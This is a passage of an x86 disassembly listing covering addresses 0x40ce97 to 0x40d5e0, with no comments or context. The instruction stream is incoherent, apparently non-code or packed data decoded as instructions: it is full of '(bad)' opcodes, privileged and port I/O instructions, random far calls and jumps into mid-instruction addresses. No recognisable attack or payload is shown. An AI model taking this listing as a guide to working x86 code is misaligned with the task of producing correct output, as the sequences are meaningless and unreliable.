  40ce97:	mov    ah,0x81
  40ce99:	loop   0x40ce55
  40ce9b:	das    
  40ce9c:	mov    esi,0xa183fafc
  40cea1:	lock dec ebx
  40cea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea4:	mov    eax,0xdf65eb02
  40cea9:	add    ch,al
  40ceab:	iret   
  40ceac:	sbb    BYTE PTR [edi-0x30],dl
  40ceaf:	mov    ch,0xf
  40ceb1:	add    eax,0xe136c089
  40ceb6:	std    
  40ceb7:	push   ss
  40ceb8:	xchg   edx,eax
  40ceb9:	fwait
  40ceba:	call   0xdadd:0x27dc1103
  40cec1:	(bad)  
  40cec2:	sahf   
  40cec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cec4:	sbb    al,0x5b
  40cec6:	outs   dx,DWORD PTR ds:[esi]
  40cec7:	iret   
  40cec8:	(bad)  
  40cec9:	shl    BYTE PTR [edx+0x7f19d6db],1
  40cecf:	mov    ds:0x9f28b109,eax
  40ced4:	popf   
  40ced5:	dec    ebx
  40ced6:	mov    esi,0x57c2b987
  40cedb:	ins    DWORD PTR es:[edi],dx
  40cedc:	(bad)  
  40cedd:	cmp    cl,ah
  40cedf:	lock daa 
  40cee1:	in     eax,0xd4
  40cee3:	ja     0x40ce92
  40cee5:	call   0x7823:0xc7a23264
  40ceec:	add    ah,BYTE PTR [edi]
  40ceee:	mov    ?,WORD PTR [esi+0x5cb3dada]
  40cef4:	mov    bh,0x2c
  40cef6:	out    0x3a,al
  40cef8:	lods   eax,DWORD PTR ds:[esi]
  40cef9:	rcl    esp,cl
  40cefb:	push   eax
  40cefc:	hlt    
  40cefd:	loope  0x40cf62
  40ceff:	addr16 mov eax,0xdfe56d8
  40cf05:	jo     0x40cf05
  40cf07:	push   ds
  40cf08:	rol    BYTE PTR [ebp-0x50],0xae
  40cf0c:	int    0x51
  40cf0e:	xor    edi,DWORD PTR [esi]
  40cf10:	mov    eax,ds:0xb228bc1e
  40cf15:	inc    edx
  40cf16:	out    dx,al
  40cf17:	cmp    DWORD PTR ds:0x8594412a,esp
  40cf1d:	icebp  
  40cf1e:	pop    eax
  40cf1f:	inc    eax
  40cf20:	je     0x40cf57
  40cf22:	cmc    
  40cf23:	add    al,0x46
  40cf25:	inc    esp
  40cf26:	push   0x4b
  40cf28:	mov    ebp,0xcdf980
  40cf2d:	shr    ebp,0xd
  40cf30:	mov    ds:0xae5e76aa,al
  40cf35:	lock dec ecx
  40cf37:	add    bh,BYTE PTR [esi+0x3ab670f4]
  40cf3d:	ds clc 
  40cf3f:	sbb    ch,bl
  40cf41:	xor    al,0x35
  40cf43:	fidivr WORD PTR [edx]
  40cf45:	jl     0x40cf87
  40cf47:	ss popa 
  40cf49:	outs   dx,DWORD PTR ds:[esi]
  40cf4a:	add    BYTE PTR [edx+eiz*1+0x404b8fce],dl
  40cf51:	fist   DWORD PTR [esi]
  40cf53:	xor    eax,0x6b155e48
  40cf58:	dec    esi
  40cf59:	lock xchg BYTE PTR [eax-0x109d99c2],bl
  40cf60:	aaa    
  40cf61:	outs   dx,DWORD PTR ds:[esi]
  40cf62:	in     eax,dx
  40cf63:	retf   0xf9d4
  40cf66:	aaa    
  40cf67:	(bad)  
  40cf68:	mov    BYTE PTR [ebp-0x146aaaee],cl
  40cf6e:	in     eax,dx
  40cf6f:	mov    ds,WORD PTR [eax+0x63]
  40cf72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf73:	(bad)  
  40cf74:	xchg   edx,eax
  40cf75:	adc    DWORD PTR [eax+0x4171e9c2],eax
  40cf7b:	xchg   DWORD PTR [edx],edx
  40cf7d:	and    al,0xc6
  40cf7f:	out    dx,eax
  40cf80:	add    edi,DWORD PTR [edi]
  40cf82:	out    dx,al
  40cf83:	pop    ds
  40cf84:	scas   al,BYTE PTR es:[edi]
  40cf85:	xchg   ebx,eax
  40cf86:	adc    al,0xfd
  40cf88:	retf   0x3da5
  40cf8b:	sub    dh,BYTE PTR [ebx+ebp*8-0x7d]
  40cf8f:	jle    0x40cf26
  40cf91:	pushf  
  40cf92:	cmp    al,0x17
  40cf94:	(bad)  
  40cf95:	xchg   esi,eax
  40cf96:	loope  0x40cf88
  40cf98:	push   es
  40cf99:	or     ch,ch
  40cf9b:	dec    ecx
  40cf9c:	pop    es
  40cf9d:	pop    ebx
  40cf9e:	add    edi,DWORD PTR [esi-0x7ace8f1b]
  40cfa4:	xchg   edx,eax
  40cfa5:	clc    
  40cfa6:	shr    DWORD PTR [esi-0x7e10ca82],cl
  40cfac:	push   eax
  40cfad:	add    ah,BYTE PTR [eax]
  40cfaf:	pop    ebp
  40cfb0:	jge    0x40cff7
  40cfb2:	cmp    BYTE PTR [esi-0x54],dh
  40cfb5:	mov    eax,ds:0x2c11f4e0
  40cfba:	adc    cl,ah
  40cfbc:	ret    0xda65
  40cfbf:	push   ecx
  40cfc0:	mov    eax,ds:0x4de9e61e
  40cfc5:	xchg   BYTE PTR [edi+0x39],ch
  40cfc8:	call   DWORD PTR [eax-0x52]
  40cfcb:	and    ebp,DWORD PTR [ecx+edi*2-0x3cb60824]
  40cfd2:	add    BYTE PTR [ecx],0xa0
  40cfd5:	call   DWORD PTR [edi+0x64]
  40cfd8:	xor    edi,DWORD PTR [eax]
  40cfda:	fstp   QWORD PTR [ecx]
  40cfdc:	fidivr DWORD PTR [ebp+edx*1-0x5cddbfe7]
  40cfe3:	add    ebx,0x3e
  40cfe6:	pop    esp
  40cfe7:	xor    bh,BYTE PTR [esi]
  40cfe9:	loopne 0x40cf7c
  40cfeb:	repnz cmp al,0x66
  40cfee:	sbb    dl,BYTE PTR [ebx+0xb345bb9]
  40cff4:	pop    esp
  40cff5:	jg     0x40cff6
  40cff7:	adc    ah,BYTE PTR [ebx-0x55]
  40cffa:	aaa    
  40cffb:	or     cl,BYTE PTR [ebx+ebx*4]
  40cffe:	aas    
  40cfff:	scas   eax,DWORD PTR es:[edi]
  40d000:	add    BYTE PTR [edx+0x6e],ch
  40d003:	enter  0x982,0xa0
  40d007:	mov    eax,ds:0x1d714811
  40d00c:	shl    DWORD PTR [edi+0x3306326e],1
  40d012:	pop    es
  40d013:	lea    esp,[edx+edx*2-0x12]
  40d017:	push   cs
  40d018:	das    
  40d019:	in     al,dx
  40d01a:	pop    edi
  40d01b:	pop    es
  40d01c:	je     0x40cff9
  40d01e:	data16 mov ss,WORD PTR [ebp-0x6]
  40d022:	aad    0x98
  40d024:	(bad)  
  40d026:	mov    ds,WORD PTR [ecx+0x59]
  40d029:	mov    dl,0x98
  40d02b:	jne    0x40d053
  40d02d:	or     bl,BYTE PTR [ebp-0x6d677742]
  40d033:	cdq    
  40d034:	mov    ecx,0xc6c7a382
  40d039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d03a:	dec    ebp
  40d03b:	sub    DWORD PTR [esi+0x48c51528],ebp
  40d041:	push   0xffffffa1
  40d043:	jnp    0x40d0af
  40d045:	jp     0x40cffa
  40d047:	push   ds
  40d048:	mov    edi,0x9a0547de
  40d04d:	int3   
  40d04e:	iret   
  40d04f:	dec    edx
  40d050:	lds    edx,FWORD PTR es:0xb2bc3256
  40d057:	inc    esi
  40d058:	mov    edx,0xba724407
  40d05d:	dec    DWORD PTR [edi+eiz*1]
  40d060:	pop    edx
  40d061:	mov    eax,ds:0x6e49710a
  40d066:	mov    edx,0x15a84037
  40d06b:	xlat   BYTE PTR ds:[ebx]
  40d06c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d06d:	dec    edx
  40d06e:	fidivr DWORD PTR [edx-0x3d0285f1]
  40d074:	pusha  
  40d075:	iret   
  40d076:	retf   0x4a75
  40d079:	pop    ecx
  40d07a:	mov    eax,fs:0x452104e2
  40d080:	sub    cl,BYTE PTR [eax+0x493d15c8]
  40d086:	cmp    esp,edi
  40d088:	xchg   esp,eax
  40d089:	mov    cl,0x13
  40d08b:	jle    0x40d0e7
  40d08d:	inc    ebp
  40d08e:	dec    edi
  40d08f:	sbb    al,0xa9
  40d091:	inc    ecx
  40d092:	jb     0x40d0f5
  40d094:	imul   edx,DWORD PTR [eax+0x45232d6f],0xc2640e4
  40d09e:	mov    dh,ch
  40d0a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0a1:	shl    BYTE PTR [esi+edx*1],1
  40d0a4:	in     al,0xcf
  40d0a6:	mov    al,0x9
  40d0a8:	fcom   st(2)
  40d0aa:	add    DWORD PTR [ebp-0x6912a2ad],edx
  40d0b0:	mov    ch,0x3c
  40d0b2:	adc    dl,0x2f
  40d0b5:	and    esp,ebx
  40d0b7:	arpl   WORD PTR [ebp-0x72],si
  40d0ba:	(bad)  
  40d0bb:	call   0xb3c73ac9
  40d0c0:	popf   
  40d0c1:	fdivr  st(1),st
  40d0c3:	pop    es
  40d0c4:	ficom  WORD PTR [eax+0x5aeb6eac]
  40d0ca:	rcr    DWORD PTR [edi],1
  40d0cc:	xchg   DWORD PTR [eax-0x33551230],edi
  40d0d2:	jno    0x40d09a
  40d0d4:	faddp  st(6),st
  40d0d6:	les    edx,FWORD PTR [eax+0x5dfa7063]
  40d0dc:	xchg   DWORD PTR [ebp-0x41],esp
  40d0df:	test   DWORD PTR [ecx+0x1f],edi
  40d0e2:	or     al,0xc9
  40d0e4:	mul    DWORD PTR [ecx-0xa365604]
  40d0ea:	cmp    al,0xaa
  40d0ec:	and    dh,BYTE PTR [ecx]
  40d0ee:	xchg   ebx,eax
  40d0ef:	jecxz  0x40d072
  40d0f1:	add    al,0xe8
  40d0f3:	adc    bl,BYTE PTR [eax-0x7c384b0f]
  40d0f9:	jmp    0x40d13a
  40d0fb:	mov    ah,0x87
  40d0fd:	dec    ebx
  40d0fe:	repnz sbb al,0xaf
  40d101:	retf   
  40d102:	pop    ds
  40d103:	mov    ds:0xf2b1727,al
  40d108:	lahf   
  40d109:	and    eax,0x4b96622f
  40d10f:	xchg   ebp,ecx
  40d111:	or     al,0xdc
  40d113:	sti    
  40d114:	cli    
  40d115:	xor    ah,0x22
  40d118:	xor    al,0x7b
  40d11a:	cmp    BYTE PTR [ebp-0x383b48e6],ah
  40d120:	jnp    0x40d155
  40d122:	push   edx
  40d123:	popf   
  40d124:	ret    0xb555
  40d127:	pop    ebx
  40d128:	out    0x47,eax
  40d12a:	xchg   esp,eax
  40d12b:	xchg   ecx,eax
  40d12c:	cli    
  40d12d:	pop    edx
  40d12e:	bound  eax,QWORD PTR [ebx-0x5a]
  40d131:	das    
  40d132:	mov    WORD PTR [edx-0x3dd77df],gs
  40d138:	xchg   ebp,eax
  40d139:	ja     0x40d16b
  40d13b:	or     dl,BYTE PTR [ecx+0x68dfead9]
  40d141:	xchg   ecx,eax
  40d142:	je     0x40d19c
  40d144:	jecxz  0x40d1a4
  40d146:	scas   al,BYTE PTR es:[edi]
  40d147:	xor    ebx,eax
  40d149:	stos   DWORD PTR es:[edi],eax
  40d14a:	jae    0x40d10b
  40d14c:	(bad)  
  40d14d:	(bad)  
  40d14f:	xor    DWORD PTR [edi],esp
  40d151:	cs mov cl,0x62
  40d154:	jnp    0x40d135
  40d156:	push   es
  40d157:	daa    
  40d158:	in     eax,0xf5
  40d15a:	bndldx bnd3,[ecx+0x58]
  40d15e:	maskmovq mm3,(bad)
  40d15f:	neg    DWORD PTR [ebx-0x7d]
  40d162:	mov    ebp,0x26b7f361
  40d167:	adc    DWORD PTR [ebp+0x2a],ecx
  40d16a:	mov    ecx,0x59ce2b13
  40d16f:	dec    ebp
  40d170:	mov    bl,0x66
  40d172:	enter  0xed1e,0xfd
  40d176:	int    0x2a
  40d178:	cmp    esp,DWORD PTR [esi+0x795bc537]
  40d17e:	(bad)  
  40d17f:	aam    0xf4
  40d181:	dec    esi
  40d182:	dec    eax
  40d183:	in     al,0x78
  40d185:	xchg   esi,eax
  40d186:	pop    ebx
  40d187:	ja     0x40d1b6
  40d189:	mov    ah,0x65
  40d18b:	into   
  40d18c:	mov    bh,0xaa
  40d18e:	push   0x33
  40d190:	xor    dl,BYTE PTR fs:[edx-0x1f52daf]
  40d197:	xchg   ecx,eax
  40d198:	jmp    FWORD PTR [ebx]
  40d19a:	push   ebp
  40d19b:	das    
  40d19c:	adc    eax,0x925276b9
  40d1a1:	daa    
  40d1a2:	mov    ah,0x11
  40d1a4:	stc    
  40d1a5:	pop    edx
  40d1a6:	std    
  40d1a7:	(bad)  
  40d1a8:	fsub   DWORD PTR [esi]
  40d1aa:	ret    0xf453
  40d1ad:	mov    ecx,0x959ac6e1
  40d1b2:	stos   DWORD PTR es:[edi],eax
  40d1b3:	lock rol BYTE PTR [eax+0x4683c745],1
  40d1ba:	xor    bl,BYTE PTR [ecx+0x34]
  40d1bd:	leave  
  40d1be:	sbb    dl,BYTE PTR [ecx]
  40d1c0:	xchg   edi,eax
  40d1c1:	cli    
  40d1c2:	pop    esp
  40d1c3:	sbb    al,cl
  40d1c5:	cmp    BYTE PTR [edx+ebp*4],bl
  40d1c8:	jae    0x40d198
  40d1ca:	mov    dl,BYTE PTR [edi-0xd]
  40d1cd:	out    dx,eax
  40d1ce:	pop    eax
  40d1cf:	sbb    DWORD PTR [ebp-0x3c],0x39
  40d1d3:	ins    BYTE PTR es:[edi],dx
  40d1d4:	mov    al,ds:0xcea21afa
  40d1d9:	retf   0xbbf8
  40d1dc:	push   esp
  40d1dd:	jns    0x40d21b
  40d1df:	and    DWORD PTR [esi+0xcf85ece],0x650bd062
  40d1e9:	sbb    esp,DWORD PTR [esi-0x27]
  40d1ec:	and    ebx,ebp
  40d1ee:	push   eax
  40d1ef:	jmp    0xe59a:0xbbf58ed2
  40d1f6:	inc    edx
  40d1f7:	xchg   edi,eax
  40d1f8:	fsub   DWORD PTR [eax+0x1f266aa3]
  40d1fe:	xor    DWORD PTR ds:[esi+0x56b8ce2],esp
  40d205:	test   BYTE PTR [edx+0x46],0x10
  40d209:	inc    ebp
  40d20a:	jecxz  0x40d1a9
  40d20c:	mov    esp,0x5604ec74
  40d211:	and    BYTE PTR [ecx-0x78],dl
  40d214:	dec    eax
  40d215:	push   edi
  40d216:	push   eax
  40d217:	mov    dh,0x7f
  40d219:	scas   al,BYTE PTR es:[edi]
  40d21a:	stos   DWORD PTR es:[edi],eax
  40d21b:	jns    0x40d241
  40d21d:	xchg   esi,eax
  40d21e:	cs inc edx
  40d220:	fisttp DWORD PTR [edx]
  40d222:	das    
  40d223:	fld    DWORD PTR [esi+0x60]
  40d226:	loopne 0x40d285
  40d228:	mov    ds:0x805a5b8b,eax
  40d22d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d22e:	pop    esp
  40d22f:	jp     0x40d1e5
  40d231:	fcmovnbe st,st(3)
  40d233:	xor    BYTE PTR ds:0x5849959a,ah
  40d239:	mov    edi,DWORD PTR [eax+0x38417c45]
  40d23f:	arpl   dx,bx
  40d241:	(bad)  
  40d242:	cmp    BYTE PTR [ecx+0x15],bl
  40d245:	cmp    BYTE PTR [edi+0x20],ah
  40d248:	pusha  
  40d249:	sub    edi,esi
  40d24b:	sbb    esi,ecx
  40d24d:	inc    ebp
  40d24e:	shl    DWORD PTR [ecx-0x3d9e0ca1],cl
  40d254:	mov    ds:0xd283a1c8,eax
  40d259:	dec    esp
  40d25a:	(bad)  
  40d25b:	dec    ecx
  40d25c:	and    DWORD PTR [edx],ecx
  40d25e:	sbb    esp,edi
  40d260:	popa   
  40d261:	cdq    
  40d262:	inc    edi
  40d263:	or     dh,BYTE PTR [ebx+esi*1]
  40d266:	es pop ds
  40d268:	dec    esi
  40d269:	mov    esp,0x2169e50a
  40d26e:	mov    esp,0x3ea7b047
  40d273:	lahf   
  40d274:	cmp    DWORD PTR [esi-0x12c1a591],edx
  40d27a:	push   ss
  40d27b:	mov    dl,0x75
  40d27d:	push   eax
  40d27e:	jbe    0x40d200
  40d280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d281:	adc    DWORD PTR ds:0xa7f31b15,ebp
  40d287:	cwde   
  40d288:	or     dl,BYTE PTR [ecx+0x66]
  40d28b:	mov    dl,0x83
  40d28d:	mov    ds:0xd935dd49,al
  40d292:	mov    ds:0x9bf40b6f,eax
  40d297:	mov    eax,0x7d653ac9
  40d29c:	mov    ds:0x3ad28f5a,eax
  40d2a1:	mov    edx,0xb5f58e8a
  40d2a6:	add    BYTE PTR [edx],bl
  40d2a8:	mov    ebp,0x4f7f222a
  40d2ad:	mov    ds:0x554e5bd8,eax
  40d2b2:	adc    eax,0x82df1b43
  40d2b7:	loopne 0x40d267
  40d2b9:	add    BYTE PTR [edi+0x1de827f4],al
  40d2bf:	repz push ds
  40d2c1:	add    al,ah
  40d2c3:	popf   
  40d2c4:	and    al,bl
  40d2c6:	or     BYTE PTR [eax],bl
  40d2c8:	inc    edx
  40d2c9:	stos   DWORD PTR es:[edi],eax
  40d2ca:	jl     0x40d262
  40d2cc:	outs   dx,BYTE PTR ds:[esi]
  40d2cd:	outs   dx,DWORD PTR ds:[esi]
  40d2ce:	adc    cl,0x47
  40d2d1:	cmp    DWORD PTR [edi+0x75b245e6],edi
  40d2d7:	xchg   ebx,eax
  40d2d8:	les    ebx,FWORD PTR [ebp+0x75fa932f]
  40d2de:	fs xchg esi,eax
  40d2e0:	out    dx,al
  40d2e1:	sub    BYTE PTR [edi-0x67],bh
  40d2e4:	adc    BYTE PTR ds:0xc0a89555,ch
  40d2ea:	jae    0x40d29c
  40d2ec:	ins    BYTE PTR es:[edi],dx
  40d2ed:	sbb    bh,dl
  40d2ef:	cmp    eax,0xdfc26627
  40d2f4:	or     bl,BYTE PTR gs:[edx+ebx*2+0x3493fe53]
  40d2fc:	test   BYTE PTR ds:0x9b1fe5a0,ah
  40d302:	or     ah,BYTE PTR [ebx]
  40d304:	adc    cl,al
  40d306:	dec    ecx
  40d307:	repnz loope 0x40d28d
  40d30a:	add    al,0xde
  40d30c:	xor    dh,BYTE PTR [esp+edx*2-0x63]
  40d310:	or     BYTE PTR [eax+0x729f6e94],dh
  40d316:	aas    
  40d317:	setge  bl
  40d31a:	fstp   DWORD PTR [edx+esi*1-0x27a75ee3]
  40d321:	(bad)  
  40d322:	cmp    eax,0x8173c17c
  40d327:	inc    ecx
  40d328:	pushf  
  40d329:	or     ecx,DWORD PTR [ebx+ebp*1-0x1be699c5]
  40d330:	or     esp,DWORD PTR [edi-0x6e]
  40d333:	mov    edi,0x42831a44
  40d338:	scas   al,BYTE PTR es:[edi]
  40d339:	dec    ebx
  40d33a:	cmp    ebp,esp
  40d33c:	inc    ebx
  40d33d:	mov    esi,0x65444922
  40d342:	pop    esp
  40d343:	out    dx,al
  40d344:	xor    eax,ecx
  40d346:	sub    al,0xf9
  40d348:	jnp    0x40d2d8
  40d34a:	test   al,0x9d
  40d34c:	push   edi
  40d34d:	aas    
  40d34e:	jl     0x40d341
  40d350:	ret    
  40d351:	push   eax
  40d352:	dec    ebp
  40d353:	mov    esi,0x92a06105
  40d358:	jnp    0x40d378
  40d35a:	dec    eax
  40d35b:	xchg   esp,esi
  40d35d:	sbb    BYTE PTR [edi+0x2003d9],cl
  40d363:	fmul   QWORD PTR [eax+0xa]
  40d366:	cmp    al,0x68
  40d368:	(bad)  
  40d369:	popa   
  40d36a:	lahf   
  40d36b:	jmp    0x19137b97
  40d370:	jnp    0x40d324
  40d372:	call   0xf673:0xf9454833
  40d379:	xchg   edx,eax
  40d37a:	jns    0x40d38f
  40d37c:	les    ebx,FWORD PTR [eax]
  40d37e:	sub    al,0x73
  40d380:	mov    edx,0x6062d0e4
  40d385:	outs   dx,BYTE PTR ds:[esi]
  40d386:	xlat   BYTE PTR ds:[ebx]
  40d387:	pop    edi
  40d388:	test   DWORD PTR [ebp+0x5a3dde9c],ecx
  40d38e:	in     eax,dx
  40d38f:	stc    
  40d390:	test   edx,0xc72134ba
  40d396:	add    cl,cl
  40d398:	idiv   DWORD PTR [eax]
  40d39a:	div    BYTE PTR [ecx+eiz*1]
  40d39d:	into   
  40d39e:	(bad)  
  40d3a0:	add    ebp,DWORD PTR [edx+0xb]
  40d3a3:	jecxz  0x40d382
  40d3a5:	dec    ecx
  40d3a6:	sti    
  40d3a7:	rol    BYTE PTR [ecx+0x50],0x34
  40d3ab:	sub    DWORD PTR [edx-0x783d234c],edx
  40d3b1:	xor    eax,0x58965c8c
  40d3b6:	xchg   ebp,eax
  40d3b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3b8:	jl     0x40d39d
  40d3ba:	inc    eax
  40d3bb:	pop    edx
  40d3bc:	dec    esi
  40d3bd:	fldenv [esi]
  40d3c0:	lods   al,BYTE PTR ds:[esi]
  40d3c1:	mov    dh,BYTE PTR [edi]
  40d3c3:	les    ebx,FWORD PTR [edx+0x59]
  40d3c6:	sbb    DWORD PTR [esi-0x52d18800],ecx
  40d3cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3cd:	ja     0x40d3b2
  40d3cf:	stc    
  40d3d0:	out    0x17,eax
  40d3d2:	call   0xaa45:0x52cacfb
  40d3d9:	mov    ecx,0x88f36
  40d3de:	int    0x5a
  40d3e0:	nop
  40d3e1:	loopne 0x40d39b
  40d3e3:	jg     0x40d3be
  40d3e5:	outs   dx,BYTE PTR ds:[esi]
  40d3e6:	std    
  40d3e7:	mov    ds,WORD PTR [ecx-0xbcd9085]
  40d3ed:	ror    BYTE PTR ds:0xebbecef6,0x4d
  40d3f4:	xor    esp,DWORD PTR [ebx+eax*8-0x4a2d769e]
  40d3fb:	sub    ebx,ebp
  40d3fd:	add    BYTE PTR [edx],ch
  40d3ff:	jg     0x40d3b7
  40d401:	mov    edx,0xd35e4da2
  40d406:	jecxz  0x40d3e6
  40d408:	ins    BYTE PTR es:[edi],dx
  40d409:	popw   es
  40d40b:	aam    0xb
  40d40d:	int3   
  40d40e:	push   ds
  40d40f:	test   eax,0x9a052790
  40d414:	fstp   st(2)
  40d416:	popa   
  40d417:	cmp    ebx,DWORD PTR [ecx-0x61823f8]
  40d41d:	fild   DWORD PTR [eax-0x4a24f842]
  40d423:	cli    
  40d424:	(bad)  
  40d425:	test   eax,0x3d76adda
  40d42a:	and    dh,BYTE PTR [ecx+ecx*1+0x7]
  40d42e:	into   
  40d42f:	nop
  40d430:	stos   BYTE PTR es:[edi],al
  40d431:	adc    DWORD PTR [esi+0x274232b4],eax
  40d437:	mov    bh,0x7c
  40d439:	and    eax,0x1583319
  40d43e:	pushf  
  40d43f:	mov    ch,0x22
  40d441:	aas    
  40d442:	pushf  
  40d443:	xor    eax,0x517960d6
  40d448:	daa    
  40d449:	dec    ebx
  40d44a:	lods   al,BYTE PTR ds:[esi]
  40d44b:	and    DWORD PTR [eax-0x67],0xffffffe4
  40d44f:	jnp    0x40d481
  40d451:	cmp    ecx,DWORD PTR [ebp+0x23582f34]
  40d457:	xor    esi,DWORD PTR [ebx+edi*2-0x59]
  40d45b:	sti    
  40d45c:	rol    cl,cl
  40d45e:	inc    edx
  40d45f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d460:	rcr    DWORD PTR [esi+0x0],cl
  40d463:	inc    eax
  40d464:	xchg   ecx,eax
  40d465:	jne    0x40d499
  40d467:	push   ecx
  40d468:	mov    dl,0x68
  40d46a:	push   esp
  40d46b:	fimul  DWORD PTR [edx-0x36]
  40d46e:	popa   
  40d46f:	retf   0x39c5
  40d472:	out    0xfd,al
  40d474:	jmp    0x40d4f1
  40d476:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d477:	(bad)  
  40d478:	aaa    
  40d479:	dec    eax
  40d47a:	cmp    eax,0xe57de92f
  40d47f:	call   0xa74301f3
  40d484:	scas   al,BYTE PTR es:[edi]
  40d485:	fdiv   DWORD PTR [eax]
  40d487:	sbb    edx,edi
  40d489:	cmp    BYTE PTR [ecx-0x5e9b89f8],al
  40d48f:	pop    esp
  40d490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d491:	xor    edi,DWORD PTR [esi-0x692ab847]
  40d497:	out    0x24,eax
  40d499:	add    ebp,DWORD PTR [edx]
  40d49b:	dec    edx
  40d49c:	sub    BYTE PTR [edi-0x61f090ed],0x7f
  40d4a3:	retf   0x3f4c
  40d4a6:	test   al,0xe9
  40d4a8:	dec    esi
  40d4a9:	pop    esp
  40d4aa:	dec    ebx
  40d4ab:	jb     0x40d52b
  40d4ad:	leave  
  40d4ae:	mov    bh,0x6d
  40d4b0:	push   esp
  40d4b1:	(bad)  
  40d4b2:	and    eax,0xd48e661e
  40d4b7:	cmp    ebp,DWORD PTR [eax-0x5c]
  40d4ba:	int    0x52
  40d4bc:	cdq    
  40d4bd:	js     0x40d4ae
  40d4bf:	mov    ds:0xb10445af,al
  40d4c4:	arpl   si,si
  40d4c6:	outs   dx,BYTE PTR ds:[esi]
  40d4c7:	ret    0x1f72
  40d4ca:	in     eax,dx
  40d4cb:	push   0xdbddec50
  40d4d0:	(bad)  
  40d4d1:	mov    dl,0x1b
  40d4d3:	retf   0x999e
  40d4d6:	xchg   DWORD PTR [eax-0x7c8bcc01],edx
  40d4dc:	push   esp
  40d4dd:	cmp    BYTE PTR [edi+0xa],dh
  40d4e0:	push   eax
  40d4e1:	sub    BYTE PTR [ebx],ch
  40d4e3:	xor    eax,0xd2a4a008
  40d4e8:	jl     0x40d507
  40d4ea:	mov    eax,ds:0x806d4120
  40d4ef:	scas   al,BYTE PTR es:[edi]
  40d4f0:	test   BYTE PTR [edi+0x17f14e1b],dh
  40d4f6:	jmp    0x40d547
  40d4f8:	cmc    
  40d4f9:	loope  0x40d4d9
  40d4fb:	adc    DWORD PTR [eax-0x3b1f306a],edi
  40d501:	jnp    0x40d4b3
  40d503:	into   
  40d504:	fmul   QWORD PTR [edx+ebx*1]
  40d507:	out    dx,eax
  40d508:	or     ecx,DWORD PTR [ecx]
  40d50a:	popf   
  40d50b:	jne    0x40d56f
  40d50d:	popa   
  40d50e:	push   ds
  40d50f:	dec    ebp
  40d510:	inc    esp
  40d511:	jmp    0x6f71d831
  40d516:	xor    DWORD PTR [ebp-0x54],ecx
  40d519:	mov    dl,0xae
  40d51b:	popa   
  40d51c:	ss loope 0x40d565
  40d51f:	jno    0x40d4f6
  40d521:	inc    eax
  40d522:	rcl    BYTE PTR [ebp+0x7c],cl
  40d525:	or     dh,BYTE PTR [ecx]
  40d527:	add    dh,bh
  40d529:	repnz mov eax,ds:0x9d799fea
  40d52f:	push   eax
  40d530:	cmp    ch,cl
  40d532:	repz cs xchg esp,eax
  40d535:	jne    0x40d544
  40d537:	xchg   ecx,eax
  40d538:	pop    edx
  40d539:	out    0xc4,eax
  40d53b:	ret    
  40d53c:	cmp    DWORD PTR [esi+eiz*8+0x9865e85],esi
  40d543:	mov    al,ds:0xbd8e1802
  40d548:	add    DWORD PTR cs:[esi+0x42],esp
  40d54c:	push   edi
  40d54d:	add    DWORD PTR [edi+0x26],ebp
  40d550:	(bad)  
  40d552:	pop    edx
  40d553:	pop    esi
  40d554:	addr16 int3 
  40d556:	push   es
  40d557:	and    BYTE PTR [esi],al
  40d559:	jnp    0x40d553
  40d55b:	icebp  
  40d55c:	sbb    al,BYTE PTR [eax]
  40d55e:	call   0xcb346169
  40d563:	loope  0x40d5d6
  40d565:	out    dx,al
  40d566:	out    0xa9,eax
  40d568:	mov    ds:0x99a6539b,al
  40d56d:	scas   al,BYTE PTR es:[edi]
  40d56e:	sbb    BYTE PTR [ebx-0x1a],dl
  40d571:	into   
  40d572:	rol    DWORD PTR ds:0x6f4bc7e1,1
  40d578:	fnstcw WORD PTR [ebx]
  40d57a:	push   esp
  40d57b:	sbb    DWORD PTR ds:0xea2d5a19,ebp
  40d581:	jns    0x40d5bd
  40d583:	dec    esi
  40d584:	jb     0x40d581
  40d586:	outs   dx,BYTE PTR ds:[esi]
  40d587:	icebp  
  40d588:	xchg   DWORD PTR [ebx-0x21],edi
  40d58b:	add    al,0xe3
  40d58d:	pop    esi
  40d58e:	jnp    0x40d5fe
  40d590:	imul   esi,DWORD PTR [edi],0xffffffcc
  40d593:	sub    edi,DWORD PTR [esi+0x2b]
  40d596:	test   BYTE PTR [eax],al
  40d598:	or     BYTE PTR [ebp+0x4b],0x87
  40d59c:	xor    ecx,DWORD PTR [esi+ebp*8+0x49]
  40d5a0:	or     eax,0x2a037323
  40d5a5:	ins    BYTE PTR es:[edi],dx
  40d5a6:	xor    al,0x15
  40d5a8:	stos   BYTE PTR es:[edi],al
  40d5a9:	push   ebp
  40d5aa:	add    DWORD PTR [edx],edx
  40d5ac:	xchg   ecx,eax
  40d5ad:	pop    eax
  40d5ae:	outs   dx,DWORD PTR ds:[esi]
  40d5af:	fwait
  40d5b0:	mov    ebx,0x2fdcc593
  40d5b5:	stos   DWORD PTR es:[edi],eax
  40d5b6:	xchg   ebp,eax
  40d5b7:	out    dx,al
  40d5b8:	ds das 
  40d5ba:	xor    DWORD PTR [eax+ecx*4+0x5e],ecx
  40d5be:	addr16 push cs
  40d5c0:	ret    0x6996
  40d5c3:	sbb    bl,bh
  40d5c5:	jns    0x40d588
  40d5c7:	jbe    0x40d637
  40d5c9:	dec    ebp
  40d5ca:	mov    ebp,ebp
  40d5cc:	jb     0x40d5cd
  40d5ce:	xor    BYTE PTR [esi+0x6a5b2b95],bl
  40d5d4:	xchg   ebp,eax
  40d5d5:	out    dx,al
  40d5d6:	jbe    0x40d5be
  40d5d8:	adc    bl,BYTE PTR [esi]
  40d5da:	stos   BYTE PTR es:[edi],al
  40d5db:	nop
  40d5dc:	test   DWORD PTR [ebx-0x4a],esp
  40d5df:	pop    esi
  40d5e0:	jg     0x40d61e
